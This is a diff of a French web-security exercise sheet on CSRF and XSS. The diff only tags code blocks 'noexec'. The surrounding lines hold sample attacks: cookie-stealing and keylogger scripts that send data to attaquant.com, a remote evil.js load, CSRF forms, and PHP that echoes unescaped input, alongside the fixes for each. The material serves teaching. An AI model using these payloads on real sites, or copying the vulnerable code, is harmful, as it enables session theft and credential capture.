@@ -52,7 +52,7 @@ GET http://192.168.0.1/WPA.php?key=91B8A3
 
 **Answer:**
 
-```html
+```html noexec
 <html>
 <body>
   <h1>Vous avez gagne un prix !</h1>
@@ -77,7 +77,7 @@ Trace d'execution :
 **Answer:**
 
 Si le routeur utilise POST au lieu de GET :
-```html
+```html noexec
 <html>
 <body>
   <h1>Chargement en cours...</h1>
@@ -118,7 +118,7 @@ Le CSRF exploite la confiance du serveur dans le navigateur de la victime. Le na
 ## Exercice 3 : XSS reflete -- Exploitation complete
 
 ### Application vulnerable :
-```php
+```php noexec
 <?php
 echo "Resultats de recherche pour : " . $_GET['q'];
 ?>
@@ -133,7 +133,7 @@ echo "Resultats de recherche pour : " . $_GET['q'];
 ```
 
 Code HTML genere par le serveur :
-```html
+```html noexec
 Resultats de recherche pour : <script>alert(document.cookie)</script>
 ```
 
@@ -161,7 +161,7 @@ Trace d'execution :
 6. L'attaquant utilise le cookie pour usurper la session de la victime
 
 **Payload alternatif (sans redirection visible) :**
-```html
+```html noexec
 <script>
   new Image().src = 'http://attaquant.com/get.php?c=' + document.cookie;
 </script>
@@ -170,7 +170,7 @@ Trace d'execution :
 Ce payload envoie le cookie via une requete d'image invisible, sans rediriger la victime.
 
 **Payload avec chargement de script distant :**
-```html
+```html noexec
 <SCRIPT SRC=http://attaquant.com/evil.js></SCRIPT>
 ```
 
@@ -200,7 +200,7 @@ Si le HTML est filtre mais pas les attributs :
 
 **Answer:**
 
-```php
+```php noexec
 <?php
 echo "Resultats de recherche pour : " . htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8');
 ?>
@@ -212,7 +212,7 @@ Decomposition de la protection :
 - `'UTF-8'` : specifie l'encodage pour eviter les attaques par encodage multi-octets
 
 Resultat avec le payload :
-```html
+```html noexec
 Resultats de recherche pour : &lt;script&gt;alert(document.cookie)&lt;/script&gt;
 ```
 
@@ -244,7 +244,7 @@ Le principe fondamental anti-XSS est : **"Never trust an output!"** Contrairemen
 **Answer:**
 
 L'attaquant poste le commentaire suivant :
-```html
+```html noexec
 Super article ! <script src="http://attaquant.com/keylogger.js"></script>
 ```
 
@@ -259,7 +259,7 @@ Trace d'execution :
 8. Si la victime se connecte, l'attaquant capture ses credentials
 
 Contenu possible de keylogger.js :
-```javascript
+```javascript noexec
 document.addEventListener('keypress', function(e) {
     new Image().src = 'http://attaquant.com/log?key=' + e.key;
 });
@@ -270,7 +270,7 @@ document.addEventListener('keypress', function(e) {
 **Answer:**
 
 **Protection 1 -- Echapper les sorties (obligatoire) :**
-```php
+```php noexec
 echo htmlspecialchars($comment, ENT_QUOTES, 'UTF-8');
 ```
 
@@ -294,7 +294,7 @@ Rejeter ou nettoyer les balises HTML dans les commentaires avec une whitelist de
 ## Exercice 5 : XSS DOM-based
 
 ### Page HTML avec message de bienvenue :
-```html
+```html noexec
 <html>
 <body>
   <div id="welcome"></div>
@@ -330,7 +330,7 @@ Trace d'execution :
 **Answer:**
 
 **Correction : `textContent` au lieu de `innerHTML`**
-```javascript
+```javascript noexec
 var name = document.location.hash.substring(1);
 document.getElementById('welcome').textContent = 'Bonjour ' + name;
 ```
@@ -449,7 +449,7 @@ Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3
 
 **Recherche (XSS reflete) :**
 Si l'entree n'est pas echappee :
-```php
+```php noexec
 echo "Resultats pour : " . $_GET['q'];
 ```
 Un attaquant envoie un lien contenant `<script>...</script>`.
@@ -463,7 +463,7 @@ Ce script s'execute pour chaque visiteur du profil.
 
 **Changement d'email (CSRF) :**
 Si le formulaire n'a pas de token anti-CSRF :
-```html
+```html noexec
 <form action="https://shop.com/settings/email" method="POST">
   <input type="hidden" name="email" value="attacker@evil.com" />
 </form>
